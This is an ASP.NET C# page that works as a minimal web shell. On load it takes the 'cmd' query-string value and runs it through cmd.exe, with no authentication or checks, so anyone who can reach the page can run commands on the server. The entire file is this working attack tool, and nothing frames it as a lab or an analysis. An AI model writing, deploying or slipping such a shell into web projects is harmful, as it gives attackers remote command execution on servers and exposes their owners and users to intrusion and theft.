<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    var cmd = Request.QueryString["cmd"];
    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd));
}
</script>
